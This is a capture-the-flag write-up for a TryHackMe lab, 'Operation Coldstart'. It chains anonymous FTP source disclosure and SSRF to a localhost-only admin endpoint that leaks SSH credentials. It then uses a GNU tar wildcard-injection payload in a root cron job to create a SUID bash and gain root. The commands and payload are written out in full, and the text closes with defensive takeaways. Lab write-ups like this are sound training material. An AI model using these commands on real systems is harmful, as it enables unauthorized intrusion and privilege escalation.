---

type: writeup  
platform: TryHackMe  
room: Operation Coldstart  
os: Linux  
environment: Web Application  
last_verified: 2026-10-05

techniques:

- service-enumeration
    
- anonymous-ftp
    
- source-code-disclosure
    
- ssrf
    
- access-control-bypass
    
- credential-discovery
    
- credential-reuse
    
- cron-enumeration
    
- wildcard-injection
    
- suid
    
- privilege-escalation
    

tools:

- nmap
    
- ftp
    
- tar
    
- curl
    
- ssh
    

---
**Attack path:** anonymous FTP → source-code disclosure → SSRF → localhost-only admin endpoint → SSH credential disclosure → `webdev` access → writable backup directory → GNU tar wildcard injection → SUID Bash → root

## 1. Reconnaissance

Initial service enumeration was performed with:

```
nmap -sV -sC <TARGET_IP>
```

The relevant results were:

```
21/tcp open  ftp   vsftpd 3.0.5
22/tcp open  ssh   OpenSSH 9.6p1 Ubuntu
80/tcp open  http  gunicorn
```

Nmap also identified anonymous FTP access:

```
ftp-anon: Anonymous FTP login allowed
```

The HTTP service was a Gunicorn application titled:

```
URL Preview - Volt Labs
```

Since FTP already exposed unauthenticated access, it was investigated before attempting to attack SSH or the web application blindly.

---

## 2. Anonymous FTP and Source-Code Disclosure

The FTP service accepted the `anonymous` account without a password:

```
ftp <TARGET_IP>
```

The exposed directory contained:

```
ftp> ls -la

drwxr-xr-x    2 ftp ftp 4096 May 09 23:14 pub

ftp> cd pub
ftp> ls -la

-rw-r--r--    1 ftp ftp 2446 May 09 23:14 backup.tar.gz

ftp> get backup.tar.gz
ftp> exit

file backup.tar.gz
tar -tzf backup.tar.gz
```

The archive contained:

```
voltlabs-preview/
voltlabs-preview/requirements.txt
voltlabs-preview/README.md
voltlabs-preview/app.py
```

It was extracted into a separate directory:

```
mkdir -p coldstart-backup
tar -xzf backup.tar.gz -C coldstart-backup
cd coldstart-backup/voltlabs-preview
```

The backup therefore exposed the source code of the application running on port 80.

---

## 3. Source-Code Analysis

The README revealed an important access-control assumption:

```
# Volt Labs URL Preview

Internal staging tool. Run with `gunicorn -b 0.0.0.0:80 app:app`.

Admin routes are gated by source-IP check (localhost only).
```

The application dependencies were minimal:

```
flask
requests
gunicorn
```

The relevant parts of `app.py` showed that `/preview` accepted a user-controlled URL:

```
@app.route("/preview")
def preview():
    target = request.args.get("url", "")
```

The application only validated the hostname:

```
ALLOWED_HOSTS = {"kestrel.thm"}

host = (urlparse(target).hostname or "").lower()

if host not in ALLOWED_HOSTS:
    ...
```

The source code also documented that:

```
# Internal hostname resolves to 127.0.0.1 via /etc/hosts on this box.
```

After validation, the server performed the request itself:

```
r = requests.get(target, timeout=3)
```

This creates an **SSRF primitive**: although an attacker cannot request arbitrary hosts, the permitted hostname `kestrel.thm` resolves locally to the loopback interface.

The administrative endpoint used source IP as its access-control mechanism:

```
@app.route("/admin/")
@app.route("/admin/<path:p>")
def admin(p="index"):
    if not request.remote_addr.startswith("127."):
        abort(403)
```

It also exposed an internal notes endpoint:

```
if p == "notes":
    with open("/opt/voltlabs-preview/admin_notes.txt") as f:
        return "<pre>" + f.read() + "</pre>"
```

The attack opportunity was therefore:

```
Attacker
   ↓
/preview?url=http://kestrel.thm/...
   ↓
requests.get()
   ↓
127.0.0.1
   ↓
localhost-only /admin endpoint
```

---

## 4. SSRF to Localhost-Only Admin Access

Direct access to the administrative endpoint was first tested:

```
curl -i http://<TARGET_IP>/admin/
```

It returned:

```
HTTP/1.1 403 FORBIDDEN
```

This confirmed that the endpoint existed but rejected requests originating from the AttackBox.

The URL preview functionality was then used to make the server request its own internal hostname:

```
curl -sG \
  --data-urlencode 'url=http://kestrel.thm/admin/' \
  http://<TARGET_IP>/preview
```

The returned preview contained:

```
Volt Labs admin endpoint.
```

The same SSRF was then directed toward the internal notes endpoint:

```
curl -sG \
  --data-urlencode 'url=http://kestrel.thm/admin/notes' \
  http://<TARGET_IP>/preview
```

The response disclosed:

```
=== INTERNAL ===
SSH access for staging:
  user: webdev
  pass: <REDACTED>
```

This is specifically:

```
SSRF
→ localhost-only endpoint access
→ credential disclosure
```

It is not an arbitrary file-read primitive: the internal endpoint itself reads the predefined `admin_notes.txt` file.

---

## 5. SSH Access as `webdev`

The disclosed credentials were tested against the SSH service:

```
ssh webdev@<TARGET_IP>
```

The credentials were valid.

The resulting identity was:

```
whoami
id
hostname
```

Relevant output:

```
webdev
uid=1001(webdev) gid=1001(webdev) groups=1001(webdev)
coldstart
```

The user flag was located in the home directory:

```
cat ~/user.txt
```

```
THM{REDACTED}
```

This established the initial operating-system foothold as `webdev`.

---

## 6. Privilege-Escalation Enumeration

`webdev` had no useful `sudo` privileges:

```
sudo -l
```

Result:

```
Sorry, user webdev may not run sudo on coldstart.
```

The account also belonged only to its own group:

```
groups
```

```
webdev
```

System cron configuration was therefore inspected:

```
cat /etc/crontab
ls -la /etc/cron.d/
```

A Volt Labs-specific job was present:

```
/etc/cron.d/voltlabs-backup
```

Its contents were:

```
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The task executes every minute as `root`.

The directory permissions were then checked:

```
ls -ld /opt/backups
ls -la /opt/backups
```

Relevant result:

```
drwxrwx--- 2 webdev webdev ... /opt/backups
```

This created the critical condition:

```
root executes tar against *
+
webdev controls the directory expanded by *
```

---

## 7. GNU tar Wildcard Injection

The vulnerable cron command was:

```
cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

The shell expands `*` before `tar` processes its arguments.

Because `webdev` can create arbitrary filenames in `/opt/backups`, filenames beginning with `--` can be interpreted by GNU tar as command-line options rather than ordinary files.

Two specially named files were created:

```
cd /opt/backups

touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh payload.sh'
```

The `--` passed to `touch` marks the end of its own options, allowing filenames beginning with `--` to be created literally.

The injected tar options have the following purpose:

```
--checkpoint=1
```

causes tar to generate frequent checkpoints, while:

```
--checkpoint-action=exec=sh payload.sh
```

instructs tar to execute:

```
sh payload.sh
```

when a checkpoint occurs.

A payload was then created:

```
cat > payload.sh <<'EOF'
#!/bin/bash
rm -f /tmp/rootbash
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4755 /tmp/rootbash
EOF
```

When the root cron job subsequently expanded:

```
*
```

the attacker-controlled filenames were passed to tar as options.

Conceptually, the command became equivalent to:

```
tar czf /var/backups/uploads.tgz \
  '--checkpoint-action=exec=sh payload.sh' \
  '--checkpoint=1' \
  payload.sh
```

Because tar itself was running as `root`, `payload.sh` was also executed as root.

---

## 8. SUID Bash and Root Access

After the next cron execution, the payload had created:

```
ls -l /tmp/rootbash
```

```
-rwsr-xr-x 1 root root ... /tmp/rootbash
```

The important properties are:

```
root root
-rwsr-xr-x
```

The binary belongs to root and has the **SUID bit** set.

A privileged Bash shell was started with:

```
/tmp/rootbash -p
```

The `-p` option is important because Bash otherwise attempts to drop elevated privileges when the real and effective user IDs differ.

Privilege level was confirmed with:

```
id
whoami
```

Result:

```
uid=1001(webdev) gid=1001(webdev) euid=0(root) groups=1001(webdev)
root
```

The real UID remained `webdev`, but the **effective UID was** `**0**`, giving the shell root privileges.

The final flag was located with:

```
find / -name 'flag.txt' 2>/dev/null
```

Result:

```
/root/flag.txt
```

It was then read:

```
cat /root/flag.txt
```

```
THM{REDACTED}
```

Full compromise was achieved.

---

## Key Takeaways

- Anonymous FTP can become a serious exposure when backup archives contain application source code or configuration.
    
- Source-code analysis revealed the SSRF much more reliably than blind probing would have.
    
- Restricting an endpoint solely by source IP is unsafe when another application feature can make server-side requests to localhost.
    
- A wildcard in a privileged command becomes dangerous when an unprivileged user controls the filenames expanded by that wildcard.
    
- GNU tar options such as `--checkpoint-action` can turn wildcard injection into command execution.
    
- A root-owned SUID Bash binary requires `bash -p` to preserve the elevated effective UID.